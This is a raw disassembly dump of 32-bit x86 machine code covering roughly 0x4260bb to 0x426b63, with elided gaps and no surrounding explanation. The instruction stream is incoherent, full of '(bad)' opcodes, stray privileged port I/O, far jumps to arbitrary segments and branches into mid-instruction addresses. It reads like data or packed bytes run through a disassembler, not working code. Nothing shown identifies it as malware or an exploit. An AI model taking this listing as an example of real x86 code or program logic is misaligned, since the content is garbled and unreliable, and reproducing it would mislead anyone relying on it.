  4260bb:	rol    dl,0x10
  4260be:	pop    ebx
  4260bf:	shl    DWORD PTR [edx-0x2d109eb9],0x2d
  4260c6:	pop    es
  4260c7:	push   cs
  4260c8:	ds or  ah,al
  4260cb:	out    0xa7,eax
  4260cd:	shl    DWORD PTR [ebx+0x6ec142d6],1
  4260d3:	xchg   BYTE PTR [edx+0x3c],dh
  4260d6:	lea    edx,[edi-0x5d]
  4260d9:	sar    BYTE PTR [edi-0x43],cl
  4260dc:	fsubr  DWORD PTR [esi+0x54]
  4260df:	ror    BYTE PTR [edx-0x1a86497f],cl
  4260e5:	jle    0x42607c
  4260e7:	imul   esi,DWORD PTR [ebp-0x3d269f2f],0xffffffcc
  4260ee:	mov    fs,WORD PTR [edi-0x28]
  4260f1:	(bad)  [edx-0x4831c4f7]
  4260f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4260f8:	xchg   esi,eax
  4260f9:	(bad)  
  4260fa:	xchg   edi,eax
  4260fb:	mov    eax,ds:0xea68431f
  426100:	dec    ebp
  426101:	adc    BYTE PTR [edx+0x3e19f544],0xed
  426108:	mov    edx,0x39f6fc00
  42610d:	sub    eax,0x2ad3e84a
  426112:	add    edi,ebx
  426114:	jg     0x4260ad
  426116:	or     al,0x9a
  426118:	ret    
  426119:	and    al,0x80
  42611b:	aaa    
  42611c:	test   al,0xc8
  42611e:	lds    ebx,FWORD PTR [edx+0x76]
  426121:	jp     0x42613a
  426123:	sub    eax,0x6299b16f
  426128:	jns    0x42619b
  42612a:	jns    0x426122
  42612c:	iret   
  42612d:	cmp    al,0x1d
  42612f:	sub    DWORD PTR [ecx+0x2d],0x7
  426133:	jle    0x426115
  426135:	jbe    0x4261a8
  426137:	or     al,BYTE PTR [edx]
  426139:	cdq    
  42613a:	call   0x12661a76
  42613f:	or     dl,BYTE PTR [ebp+0x18]
  426142:	jbe    0x42619d
  426144:	retf   0xea50
  426147:	sbb    BYTE PTR [edx+ebp*1+0x60],bh
  42614b:	add    al,0x3d
  42614d:	mov    esp,0x8a5cf61c
  426152:	in     al,dx
  426153:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426154:	pop    esp
  426155:	push   eax
  426156:	pop    ecx
  426157:	cld    
  426158:	lea    ebx,[esi+0x732584e7]
  42615e:	cli    
  42615f:	add    edi,esp
  426161:	jmp    0x6431:0xce2c93b6
  426168:	in     eax,dx
  426169:	dec    esp
  42616a:	mov    ds:0xf720952e,eax
  42616f:	xchg   DWORD PTR [edi],ebp
  426171:	mov    ebp,0x5038abb3
  426176:	mul    DWORD PTR [edi-0x40]
  426179:	dec    esi
  42617a:	sbb    DWORD PTR [edi-0x5eee9f08],ebx
  426180:	inc    esp
  426181:	jb     0x426152
  426183:	inc    esi
  426184:	or     ah,BYTE PTR ss:[esi]
  426187:	or     eax,0x89b81337
  42618c:	jmp    0x0:0x6d4a7e
	...
  4261f3:	add    BYTE PTR [ebx-0x409ef0df],bl
  4261f9:	outs   dx,DWORD PTR ds:[esi]
  4261fa:	(bad)  
  4261fb:	sti    
  4261fc:	mov    bh,0x83
  4261fe:	mov    cl,0x27
  426200:	sub    ebp,esi
  426202:	mov    ah,0x71
  426204:	in     al,0x96
  426206:	add    DWORD PTR [eax],eax
  426208:	add    al,0x1
  42620a:	add    BYTE PTR [eax],al
  42620c:	mov    esp,0x35157ae5
  426211:	push   cs
  426212:	loopne 0x4261d6
  426214:	lods   eax,DWORD PTR ds:[esi]
  426215:	inc    ebp
  426216:	mov    ss,WORD PTR [edi-0x4]
  426219:	ds dec edx
  42621b:	ror    BYTE PTR [ebp+edx*8-0x1870ebf3],0xad
  426223:	mov    bh,0x7b
  426225:	push   0xffffff85
  426227:	lock jecxz 0x42625b
  42622a:	mov    BYTE PTR [si+0x3b],0x3c
  42622f:	pop    ebp
  426230:	enter  0xa37,0x69
  426234:	add    BYTE PTR [esi+edi*4-0x22],al
  426238:	inc    edx
  426239:	sbb    ch,ah
  42623b:	leave  
  42623c:	pop    ebx
  42623d:	call   0xea45:0x34e222e5
  426244:	inc    ebp
  426245:	sbb    DWORD PTR [edx-0x25],ecx
  426248:	and    DWORD PTR ds:0xb1db01b5,0x8fa24d8b
  426252:	jecxz  0x426215
  426254:	xchg   edi,eax
  426255:	rcr    DWORD PTR [esp+esi*1-0x24],cl
  426259:	sbb    al,0x1b
  42625b:	in     eax,0x6e
  42625d:	dec    ebx
  42625e:	inc    eax
  42625f:	cmc    
  426260:	push   edi
  426261:	aad    0xd
  426263:	sbb    al,0xb9
  426265:	cwde   
  426266:	div    BYTE PTR [esi-0x21]
  426269:	pushf  
  42626a:	jp     0x42626b
  42626c:	pop    edi
  42626d:	es stos DWORD PTR es:[edi],eax
  42626f:	das    
  426270:	inc    eax
  426271:	arpl   WORD PTR ds:0xd6385240,ax
  426277:	sbb    BYTE PTR [eax],bh
  426279:	xor    esi,DWORD PTR [ecx+ecx*8-0xb96e8dd]
  426280:	loopne 0x4262bf
  426282:	push   edx
  426283:	mov    ds:0xa4bcea06,eax
  426288:	add    DWORD PTR [ebp+esi*2-0x214cd6ff],ebx
  42628f:	xor    BYTE PTR [esi+0x67],dl
  426292:	test   BYTE PTR [edi+0x5a1f1400],al
  426298:	fmul   QWORD PTR ds:0x48ba2079
  42629e:	out    dx,al
  42629f:	add    BYTE PTR [ecx+edi*4],bl
  4262a2:	mov    BYTE PTR [ebx-0x7a],al
  4262a5:	push   edx
  4262a6:	stc    
  4262a7:	dec    edx
  4262a8:	dec    esp
  4262a9:	adc    ch,BYTE PTR [ebx]
  4262ab:	mov    dl,0x8a
  4262ad:	test   DWORD PTR [esp+ecx*4+0x269fc427],ecx
  4262b4:	das    
  4262b5:	fisubr WORD PTR [edx]
  4262b7:	ror    DWORD PTR [esi-0x29],1
  4262ba:	ret    
  4262bb:	or     BYTE PTR [edi-0x39],al
  4262be:	cdq    
  4262bf:	mov    esi,DWORD PTR [ebp-0x5a5657b5]
  4262c5:	adc    eax,0x7b07ef88
  4262ca:	push   cs
  4262cb:	sbb    DWORD PTR [ebp-0x2ab23290],ebp
  4262d1:	out    dx,eax
  4262d2:	iret   
  4262d3:	stc    
  4262d4:	add    eax,0xc83d6e41
  4262d9:	retf   0xcc19
  4262dc:	outs   dx,DWORD PTR ds:[esi]
  4262dd:	mov    eax,0xda50d910
  4262e2:	out    0x51,eax
  4262e4:	leave  
  4262e5:	mov    ch,0x5b
  4262e7:	sbb    DWORD PTR [edi-0x59],esi
  4262ea:	adc    DWORD PTR [ebx+0x947943e],edx
  4262f0:	jno    0x426332
  4262f2:	rcl    DWORD PTR [esi+0x68a34f40],1
  4262f8:	sub    al,0xfb
  4262fa:	adc    DWORD PTR [eax-0x20],edx
  4262fd:	jae    0x4262ce
  4262ff:	repz push edi
  426301:	imul   eax,DWORD PTR [esi],0x746f221
  426307:	call   0xc79d73b4
  42630c:	inc    ecx
  42630d:	and    eax,0x6002
	...
  426372:	add    BYTE PTR [eax],al
  426374:	push   esp
  426375:	and    eax,0xeefd4e8d
  42637a:	xlat   BYTE PTR ds:[ebx]
  42637b:	aas    
  42637c:	dec    ecx
  42637d:	sbb    esi,edi
  42637f:	or     eax,0xd0e039c6
  426384:	call   0x4426520
  426389:	add    DWORD PTR [eax],eax
  42638b:	add    BYTE PTR [ecx-0x1c],dl
  42638e:	repnz dec bh
  426391:	jl     0x4263e0
  426393:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426394:	pop    edi
  426395:	jmp    0x4263fa
  426397:	les    ecx,FWORD PTR [edx-0x7c]
  42639a:	pop    ecx
  42639b:	push   0x1d8a564e
  4263a0:	jge    0x4263f1
  4263a2:	pop    edi
  4263a3:	repz and eax,0x9de150c9
  4263a9:	jno    0x426361
  4263ab:	pop    esi
  4263ac:	mov    esp,0x7eb3e604
  4263b1:	xor    eax,0x1660f29d
  4263b6:	xor    DWORD PTR [eax+0x7f],edx
  4263b9:	dec    ecx
  4263ba:	sar    DWORD PTR [ebx+0x781f3d6e],cl
  4263c0:	xor    BYTE PTR [eax],bh
  4263c2:	adc    ebp,DWORD PTR [edi]
  4263c4:	pop    ss
  4263c5:	pop    esi
  4263c6:	shr    DWORD PTR ds:0x2f677112,cl
  4263cc:	imul   esp,edx,0x52
  4263cf:	mov    esi,0xbb59d82d
  4263d4:	lahf   
  4263d5:	or     BYTE PTR [ecx-0x359dcccb],ah
  4263db:	and    DWORD PTR [eax+0x22efc29b],ebx
  4263e1:	aad    0xc6
  4263e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4263e4:	and    BYTE PTR [ecx+0x653a02f3],dh
  4263ea:	sbb    ecx,DWORD PTR [esi+0xa]
  4263ed:	jne    0x426392
  4263ef:	or     al,0x21
  4263f1:	jmp    0x4263e5
  4263f3:	push   ss
  4263f4:	cmp    eax,0xde998e79
  4263f9:	mov    ebp,0x37d56b3f
  4263fe:	imul   esp,DWORD PTR [edi-0x7],0x95d3288c
  426405:	jmp    0x1a665e42
  42640a:	fcomp  QWORD PTR [edi+esi*4]
  42640d:	stc    
  42640e:	jb     0x426431
  426410:	cwde   
  426411:	or     eax,0xa7d0f640
  426416:	mov    ebp,0x10d445cf
  42641b:	mov    ds:0x21ea71ea,eax
  426420:	call   0xe338f541
  426425:	cdq    
  426426:	test   DWORD PTR [esi+0x77],eax
  426429:	shr    DWORD PTR [edi+edi*1],1
  42642c:	loope  0x426483
  42642e:	out    0xd3,eax
  426430:	pop    ebx
  426431:	shl    esp,0x3d
  426434:	mul    DWORD PTR [edx-0x213d85f9]
  42643a:	imul   ebp,DWORD PTR [eax+0x37],0x41af3075
  426441:	mov    ebx,DWORD PTR [edi]
  426443:	shr    DWORD PTR [esi+ecx*8-0x5eee7afc],0x6e
  42644b:	or     al,0xd7
  42644d:	inc    eax
  42644e:	out    dx,al
  42644f:	xchg   BYTE PTR [esi+0x21122b42],bl
  426455:	mov    dl,al
  426457:	in     al,dx
  426458:	aas    
  426459:	sahf   
  42645a:	adc    al,BYTE PTR [ecx]
  42645c:	xchg   ecx,eax
  42645d:	xor    eax,esp
  42645f:	dec    edi
  426460:	adc    al,0x96
  426462:	les    ebx,FWORD PTR ds:0xb1aa7427
  426468:	or     DWORD PTR ds:0xbbe7b944,ebx
  42646e:	and    esp,0x72
  426471:	fcmovnu st,st(4)
  426473:	daa    
  426474:	sub    eax,0x58f59896
  426479:	addr16 retf 
  42647b:	push   ss
  42647c:	mov    al,0x17
  42647e:	jp     0x42649e
  426480:	lods   al,BYTE PTR ds:[esi]
  426481:	xchg   esi,eax
  426482:	or     BYTE PTR [ebx-0x712555b5],bl
  426488:	cwde   
  426489:	xchg   BYTE PTR [edx+ebp*4+0x7419df4d],bh
	...
  4264f4:	imul   ebp,DWORD PTR [edi-0x78],0xe9ef8e08
  4264fb:	outs   dx,DWORD PTR ds:[esi]
  4264fc:	vmwrite ecx,DWORD PTR [edx+0x19d9cb85]
  426503:	adc    ebp,esp
  426505:	cwde   
  426506:	add    DWORD PTR [eax],eax
  426508:	add    al,0x1
  42650a:	add    BYTE PTR [eax],al
  42650c:	(bad)  
  42650d:	dec    ebp
  42650e:	jns    0x4264c0
  426510:	int    0xde
  426512:	sahf   
  426513:	adc    BYTE PTR [edi+0x63],al
  426516:	mov    al,0x56
  426518:	jns    0x4264a0
  42651a:	daa    
  42651b:	(bad)  
  42651c:	xor    eax,0x7eeb462a
  426521:	jnp    0x426541
  426523:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426524:	sub    edx,DWORD PTR [eax+esi*8]
  426527:	adc    al,0x45
  426529:	push   edx
  42652a:	xlat   BYTE PTR ds:[ebx]
  42652b:	pop    ecx
  42652c:	dec    edi
  42652d:	lea    esp,[ebx+0x42efb363]
  426533:	pop    eax
  426534:	xor    BYTE PTR [esi],ah
  426536:	nop
  426537:	shl    BYTE PTR [edi-0x60],cl
  42653a:	pusha  
  42653b:	inc    eax
  42653c:	cmc    
  42653d:	aas    
  42653e:	pop    edi
  42653f:	(bad)  
  426540:	adc    ch,BYTE PTR [edi-0x69]
  426543:	mov    BYTE PTR [ecx-0x21434040],al
  426549:	mov    BYTE PTR [esi+0x307acf02],0xf2
  426550:	adc    BYTE PTR [ecx-0x71],dl
  426553:	test   DWORD PTR [ebx+0x27],esp
  426556:	inc    BYTE PTR [ecx+0x75c1d8d5]
  42655c:	pop    edi
  42655d:	(bad)  
  42655e:	mov    bh,0x66
  426560:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426561:	push   eax
  426562:	stos   BYTE PTR es:[edi],al
  426563:	inc    cx
  426565:	enter  0x6ad0,0x1b
  426569:	xor    DWORD PTR [eax-0x6f],esp
  42656c:	retf   
  42656d:	popf   
  42656e:	sar    bl,0x66
  426571:	cmc    
  426572:	mov    esi,0x86bc54c1
  426577:	pop    ss
  426578:	pop    ss
  426579:	call   0x1e28573b
  42657e:	bound  ecx,QWORD PTR [ebx+0x62ce5978]
  426584:	xor    ecx,esp
  426586:	in     eax,0xb
  426588:	mov    eax,0x302de289
  42658d:	push   eax
  42658e:	dec    esi
  42658f:	mov    eax,ds:0xaa255574
  426594:	(bad)  
  426595:	fstp   DWORD PTR [ebx]
  426597:	fiadd  WORD PTR [ebx]
  426599:	mov    edi,0x6fdac78
  42659e:	xchg   cl,dl
  4265a0:	sar    DWORD PTR [ecx-0x11],0xd8
  4265a4:	sahf   
  4265a5:	xor    BYTE PTR [eax+0x14],al
  4265a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4265a9:	(bad)  [esi]
  4265ab:	or     DWORD PTR [eax+ebx*1-0x75],edi
  4265af:	sbb    ebx,DWORD PTR [esi+0x1786431c]
  4265b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4265b6:	xchg   ecx,eax
  4265b7:	sub    ah,bl
  4265b9:	mov    dh,0x2a
  4265bb:	add    DWORD PTR [esi-0x3d],esi
  4265be:	(bad)  
  4265bf:	push   esi
  4265c0:	test   DWORD PTR [esi-0x3472e201],eax
  4265c6:	pop    eax
  4265c7:	les    esi,FWORD PTR [ebx]
  4265c9:	push   ecx
  4265ca:	ret    
  4265cb:	stos   BYTE PTR es:[edi],al
  4265cc:	jb     0x4265c7
  4265ce:	jg     0x42655f
  4265d0:	test   eax,0x881f4405
  4265d5:	div    bh
  4265d7:	mov    eax,ds:0x6f52f441
  4265dc:	add    eax,0xbb58c48e
  4265e1:	dec    esi
  4265e2:	sub    ebx,DWORD PTR [ebp-0x3b]
  4265e5:	mov    DWORD PTR [esi+0x74722210],esp
  4265eb:	(bad)  
  4265ec:	sar    DWORD PTR [ecx+0x3b776921],cl
  4265f2:	jge    0x426648
  4265f4:	data16 mov al,es:0x4e8b8fba
  4265fb:	pop    edi
  4265fc:	xor    al,0x98
  4265fe:	out    0xf7,al
  426600:	cmp    cl,BYTE PTR [edi+esi*8]
  426603:	aas    
  426604:	push   es
  426605:	in     eax,0x32
  426607:	pop    edi
  426608:	ins    BYTE PTR es:[edi],dx
  426609:	imul   edi,DWORD PTR [eax-0x4a],0xffffff89
  42660d:	dec    edi
  42660e:	int    0x45
	...
  426674:	adc    cl,bl
  426676:	sbb    DWORD PTR [edx],0xcb9b5ad9
  42667c:	pop    DWORD PTR [edi-0x3af8925c]
  426682:	mov    dh,0x6c
  426684:	lock cdq 
  426686:	add    DWORD PTR [eax],eax
  426688:	add    al,0x1
  42668a:	add    BYTE PTR [eax],al
  42668c:	xchg   edx,eax
  42668d:	mov    ah,bl
  42668f:	cmp    BYTE PTR [edx-0x35],al
  426692:	je     0x4266d0
  426694:	add    ecx,edi
  426696:	arpl   WORD PTR [ebp+0x62],cx
  426699:	mov    cl,0x36
  42669b:	sbb    ch,BYTE PTR [eax+ebp*1]
  42669e:	xchg   BYTE PTR [edi],cl
  4266a0:	cmp    si,WORD PTR [esi+0x1a3e4206]
  4266a7:	jge    0x42663b
  4266a9:	push   0x3fd4863c
  4266ae:	jp     0x426716
  4266b0:	push   eax
  4266b1:	jle    0x426718
  4266b3:	mov    ebp,0xe3a01fc1
  4266b8:	or     cl,al
  4266ba:	shl    bl,0xdd
  4266bd:	push   edi
  4266be:	xor    eax,0xeb02c47d
  4266c3:	push   ecx
  4266c4:	xor    al,dh
  4266c6:	or     BYTE PTR [esi+0x20e7143d],bh
  4266cc:	and    al,BYTE PTR [esi]
  4266ce:	in     al,0x11
  4266d0:	fwait
  4266d1:	add    eax,0x652edaef
  4266d6:	pop    ebp
  4266d7:	and    BYTE PTR [edx],al
  4266d9:	ficomp DWORD PTR [edi]
  4266db:	add    dl,BYTE PTR [edi-0xb858aa8]
  4266e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4266e2:	or     ebp,esp
  4266e4:	daa    
  4266e5:	je     0x42674c
  4266e7:	ret    0x26d5
  4266ea:	sbb    al,0x4c
  4266ec:	jge    0x4266ce
  4266ee:	enter  0x7b86,0x74
  4266f2:	jne    0x4266a3
  4266f4:	cmp    DWORD PTR [ecx],ebp
  4266f6:	gs xchg ebp,eax
  4266f8:	arpl   WORD PTR [edi-0x1],cx
  4266fb:	jmp    0xb71d:0xda138df2
  426702:	adc    ch,BYTE PTR [edx-0x5b35ad40]
  426708:	sbb    DWORD PTR [eax+0x4a],ebp
  42670b:	aam    0xa8
  42670d:	mov    ebp,0x987cbb9d
  426712:	jle    0x426722
  426714:	mov    eax,ds:0x889134b5
  426719:	inc    ebp
  42671a:	mov    ebp,0xd684475b
  42671f:	jno    0x4266c5
  426721:	mov    esi,0xd478f7e4
  426726:	mov    BYTE PTR [ebx+edi*8-0x6d31182c],bh
  42672d:	xchg   ebx,eax
  42672e:	xchg   edi,eax
  42672f:	jmp    0x42678e
  426731:	mov    al,ds:0xc2f2a18d
  426736:	test   bp,0x7337
  42673b:	aas    
  42673c:	inc    ebp
  42673d:	dec    ebx
  42673e:	mov    ebp,0xba77ee66
  426743:	lahf   
  426744:	inc    ebp
  426745:	ja     0x4266eb
  426747:	adc    eax,0x23680534
  42674c:	pop    ecx
  42674d:	je     0x4267c7
  42674f:	or     BYTE PTR ds:0x70655245,ah
  426755:	rol    DWORD PTR [ecx-0x3b4e73d4],cl
  42675b:	rol    DWORD PTR ds:0x334e0ad3,cl
  426761:	jb     0x426710
  426763:	lds    ebx,FWORD PTR [ecx-0x2a161fe8]
  426769:	imul   edx,DWORD PTR ds:0xc4e09ec1,0x953cf8a9
  426773:	dec    ecx
  426774:	jne    0x4267be
  426776:	xor    al,BYTE PTR [ebp+ecx*4+0x23]
  42677a:	test   DWORD PTR [edi+eax*2],edx
  42677d:	jno    0x4267a7
  42677f:	sti    
  426780:	and    eax,0xfecc8c1e
  426785:	(bad)  
  426787:	int3   
  426788:	sbb    BYTE PTR [ecx+0x2b],ch
  42678b:	idiv   DWORD PTR [ecx+0x4c]
  42678e:	shl    DWORD PTR [esi+0x0],1
	...
  4267f1:	add    BYTE PTR [eax],al
  4267f3:	add    BYTE PTR [eax-0xd53173],bh
  4267f9:	imul   edi,esp,0xffffff9f
  4267fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4267fd:	and    dh,0xca
  426800:	repz jno 0x4267c7
  426803:	pop    es
  426804:	hlt    
  426805:	call   0x0:0x1040001
  42680c:	or     dh,dh
  42680e:	or     eax,0xdb13f9c0
  426813:	clflush BYTE PTR [edi+0x68]
  426817:	pop    esi
  426818:	sahf   
  426819:	pop    ss
  42681a:	inc    esi
  42681b:	retf   
  42681c:	sbb    eax,0xffffffa4
  42681f:	mov    ah,0x5
  426821:	xchg   esp,eax
  426822:	in     eax,dx
  426823:	xor    ebx,DWORD PTR [eax]
  426825:	ret    0x61f5
  426828:	je     0x426829
  42682a:	and    ch,0x48
  42682d:	test   al,bh
  42682f:	mov    esp,edx
  426831:	jecxz  0x4267d3
  426833:	and    ebx,DWORD PTR [esi]
  426835:	fcom   DWORD PTR [ebx]
  426837:	dec    esp
  426838:	jl     0x4268b3
  42683a:	jle    0x4268ac
  42683c:	sbb    BYTE PTR [ecx+0x6b],ah
  42683f:	cld    
  426840:	std    
  426841:	xchg   ebx,eax
  426842:	leave  
  426843:	and    cl,dh
  426845:	mov    ds:0xa0023708,al
  42684a:	push   ds
  42684b:	lock js 0x4267e2
  42684e:	jmp    0xe88b:0x32b488fc
  426855:	sbb    BYTE PTR [ecx-0x10298d1f],ah
  42685b:	inc    ecx
  42685c:	push   eax
  42685d:	jb     0x426856
  42685f:	xchg   esp,eax
  426860:	adc    bl,BYTE PTR [ecx]
  426862:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426863:	and    ebx,DWORD PTR [eax+0xbabcd5c]
  426869:	lods   eax,DWORD PTR ds:[esi]
  42686a:	(bad)  
  42686b:	push   edx
  42686c:	lahf   
  42686d:	js     0x4268e4
  42686f:	fimul  WORD PTR [edi-0x2c]
  426872:	popf   
  426873:	(bad)  
  426874:	fadd   st(1),st
  426876:	fistp  QWORD PTR [ebp-0x59]
  426879:	push   esi
  42687a:	jl     0x426806
  42687c:	lods   eax,DWORD PTR ds:[esi]
  42687d:	or     BYTE PTR [ebx+0x1bea9642],0x2f
  426884:	es int3 
  426886:	ss pop es
  426888:	dec    edx
  426889:	cmp    al,0x74
  42688b:	call   0x681c4db4
  426890:	xchg   esi,eax
  426891:	nop
  426892:	jl     0x426889
  426894:	cmp    ah,BYTE PTR [ebp+0x77]
  426897:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426898:	test   ebx,edi
  42689a:	sbb    ebx,DWORD PTR [ecx+0x25ab697a]
  4268a0:	jno    0x426914
  4268a2:	mov    ss,ebp
  4268a4:	xor    al,0xaf
  4268a6:	outs   dx,BYTE PTR ds:[esi]
  4268a7:	je     0x426900
  4268a9:	push   ss
  4268aa:	(bad)  
  4268ab:	mov    ds:0x9374d76a,eax
  4268b0:	(bad)  
  4268b2:	aam    0xc
  4268b4:	sub    DWORD PTR [edx-0x585c32b7],edi
  4268ba:	push   0x118fd186
  4268bf:	sahf   
  4268c0:	cwde   
  4268c1:	imul   ecx,DWORD PTR [edi-0x3e550399],0xffffffb6
  4268c8:	leave  
  4268c9:	and    BYTE PTR [ebp+0x1d],cl
  4268cc:	xchg   ah,dl
  4268ce:	mov    ah,0xb2
  4268d0:	rcr    BYTE PTR [ecx*4-0x7a8a02de],cl
  4268d7:	jnp    0x4268b5
  4268d9:	cmp    ah,0xcf
  4268dc:	mov    al,ds:0xd4a5c786
  4268e1:	je     0x426887
  4268e3:	sub    BYTE PTR [ecx],ah
  4268e5:	dec    ebx
  4268e6:	mov    bh,0x52
  4268e8:	and    BYTE PTR [ebx+ebp*4],dl
  4268eb:	sub    esi,DWORD PTR [ecx+eiz*4]
  4268ee:	aas    
  4268ef:	fs aas 
  4268f1:	lods   al,BYTE PTR ds:[esi]
  4268f2:	mov    edi,0x4b7f03e2
  4268f7:	retf   
  4268f8:	push   edi
  4268f9:	mov    ebp,0xbe495249
  4268fe:	(bad)  
  4268ff:	(bad)  [esp+edx*4+0x32]
  426903:	std    
  426904:	push   ebp
  426905:	dec    edx
  426906:	inc    esi
  426907:	sahf   
  426908:	std    
  426909:	lock popf 
  42690b:	cmp    eax,0xc811246e
	...
  426974:	mov    WORD PTR [esi+0x7d],cs
  426977:	jge    0x426978
  426979:	jg     0x426907
  42697b:	jmp    FWORD PTR [ebx]
  42697d:	in     al,dx
  42697e:	lahf   
  42697f:	mov    esp,edi
  426981:	or     dh,ch
  426983:	or     edi,eax
  426985:	fwait
  426986:	add    DWORD PTR [eax],eax
  426988:	add    al,0x1
  42698a:	add    BYTE PTR [eax],al
  42698c:	mov    sp,0x72e2
  426990:	int    0xdf
  426992:	and    al,0xd3
  426994:	mul    BYTE PTR [edx+0x1c9622f4]
  42699a:	push   edi
  42699b:	lods   al,BYTE PTR ds:[esi]
  42699c:	mov    ebx,0x98c77f2a
  4269a1:	mov    WORD PTR [esi-0x6cef0be0],fs
  4269a7:	push   ebp
  4269a8:	pop    eax
  4269a9:	ss shl ebp,cl
  4269ac:	push   cs
  4269ad:	jns    0x4269dd
  4269af:	inc    ebx
  4269b0:	ins    DWORD PTR es:[edi],dx
  4269b1:	(bad)  
  4269b2:	xchg   ecx,eax
  4269b3:	jmp    0x426999
  4269b5:	repnz fiadd DWORD PTR [eax+0xfea5f89]
  4269bc:	xor    eax,0xc122c202
  4269c1:	mov    esp,0x188f697f
  4269c6:	fidiv  WORD PTR [ebx+0x54]
  4269c9:	xor    DWORD PTR [eax+eiz*4-0x8],eax
  4269cd:	mov    edi,0xb87243a6
  4269d2:	adc    al,BYTE PTR [edi-0x6519355f]
  4269d8:	lds    ecx,FWORD PTR [edx-0x12]
  4269db:	into   
  4269dc:	mov    BYTE PTR [eax-0x1a],dl
  4269df:	sbb    ch,ch
  4269e1:	xchg   esp,eax
  4269e2:	inc    edi
  4269e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4269e4:	lea    ebx,ds:0xfc98aa4a
  4269ea:	pop    ebx
  4269eb:	xor    dh,BYTE PTR [ecx+0x5545014e]
  4269f1:	sbb    BYTE PTR ds:0x4c649f31,dh
  4269f7:	push   ebp
  4269f8:	rol    BYTE PTR [ebx-0x771705a7],cl
  4269fe:	rcr    DWORD PTR [ecx-0x55493c75],1
  426a04:	cwde   
  426a05:	adc    BYTE PTR [edi+0x49b06122],dl
  426a0b:	jg     0x4269fb
  426a0d:	sub    eax,0x7fd34b07
  426a12:	loopne 0x4269ce
  426a14:	sbb    dh,BYTE PTR [esi]
  426a16:	pop    edx
  426a17:	xchg   edi,eax
  426a18:	sub    cl,BYTE PTR [esp+ebx*4-0xf]
  426a1c:	and    bl,BYTE PTR [eax-0x31]
  426a1f:	sub    eax,0x80ab2e3c
  426a24:	jl     0x426a30
  426a26:	inc    ebx
  426a27:	xchg   ebx,eax
  426a28:	call   0xffa0:0xf540e3a8
  426a2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a30:	pop    eax
  426a31:	scas   eax,DWORD PTR es:[edi]
  426a32:	repnz inc BYTE PTR [esi]
  426a35:	xchg   ebx,eax
  426a36:	jo     0x426a09
  426a38:	hlt    
  426a39:	dec    ebx
  426a3a:	neg    DWORD PTR [esi-0x35]
  426a3d:	xchg   ecx,eax
  426a3e:	xchg   DWORD PTR [edi],eax
  426a40:	imul   edx,DWORD PTR [eax-0x3059f5b7],0xab965abb
  426a4a:	lods   al,BYTE PTR ds:[esi]
  426a4b:	(bad)  
  426a4c:	(bad)  
  426a4d:	test   eax,0xd98597a3
  426a52:	lods   al,BYTE PTR ds:[esi]
  426a53:	xor    bl,BYTE PTR [ecx]
  426a55:	loop   0x426a30
  426a57:	xchg   edx,eax
  426a58:	pop    ecx
  426a59:	fadd   st(7),st
  426a5b:	fnstenv [edi+0x51]
  426a5e:	push   edi
  426a5f:	cmp    bh,cl
  426a61:	repz rcr dh,1
  426a64:	adc    eax,0xa3491586
  426a69:	sbb    ecx,eax
  426a6b:	push   edi
  426a6c:	les    edi,FWORD PTR [ebx]
  426a6e:	(bad)  
  426a6f:	scas   al,BYTE PTR es:[edi]
  426a70:	lds    eax,FWORD PTR [edx-0xc]
  426a73:	hlt    
  426a74:	repz sub al,0x55
  426a77:	push   edi
  426a78:	into   
  426a79:	adc    bl,BYTE PTR [ecx]
  426a7b:	jne    0x426a0e
  426a7d:	fstp   DWORD PTR [ecx+0x17]
  426a80:	xchg   edx,eax
  426a81:	bound  esp,QWORD PTR [ecx]
  426a83:	fwait
  426a84:	aam    0x55
  426a86:	cld    
  426a87:	jmp    0x426ad4
  426a89:	outs   dx,DWORD PTR ds:[esi]
  426a8a:	outs   dx,BYTE PTR ds:[esi]
  426a8b:	out    0xa2,al
  426a8d:	int    0xcd
  426a8f:	pop    ebp
	...
  426af4:	cdq    
  426af5:	sub    BYTE PTR ds:0xdb77bd56,cl
  426afb:	out    dx,eax
  426afc:	inc    esi
  426afd:	sub    DWORD PTR [esi],edi
  426aff:	or     al,0xbc
  426b01:	or     BYTE PTR [ebx+0x15],dl
  426b04:	cld    
  426b05:	pushf  
  426b06:	add    DWORD PTR [eax],eax
  426b08:	add    al,0x1
  426b0a:	add    BYTE PTR [eax],al
  426b0c:	pop    ds
  426b0d:	call   0xf634:0x76f035c
  426b14:	cli    
  426b15:	test   al,0x3f
  426b17:	xchg   esp,eax
  426b18:	hlt    
  426b19:	jp     0x426aeb
  426b1b:	jmp    0x426b65
  426b1d:	nop
  426b1e:	cdq    
  426b1f:	push   esi
  426b20:	lds    ecx,FWORD PTR [esi+0x3a6306ff]
  426b26:	stos   DWORD PTR es:[edi],eax
  426b27:	je     0x426b5b
  426b29:	mov    eax,ds:0x84828fd9
  426b2e:	(bad)  
  426b2f:	mov    ah,dh
  426b31:	dec    ebx
  426b32:	lock xchg esp,eax
  426b34:	add    BYTE PTR [esi-0x11],al
  426b37:	ins    DWORD PTR es:[edi],dx
  426b38:	(bad)  
  426b39:	dec    esp
  426b3a:	dec    edi
  426b3b:	inc    ebp
  426b3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426b3d:	ds adc eax,0xb2e18433
  426b43:	pop    ebp
  426b44:	sbb    BYTE PTR [edi+0x28608ce9],0x72
  426b4b:	inc    BYTE PTR [ebp-0x7f68e3a9]
  426b51:	push   eax
  426b52:	push   0x2c
  426b54:	inc    ecx
  426b55:	xchg   esi,eax
  426b56:	adc    cl,BYTE PTR [edx-0x69]
  426b59:	jno    0x426b83
  426b5b:	(bad)  
  426b5d:	lds    ebp,FWORD PTR [ebp+0x4fb89efc]
  426b63:	mov    bl,0x46
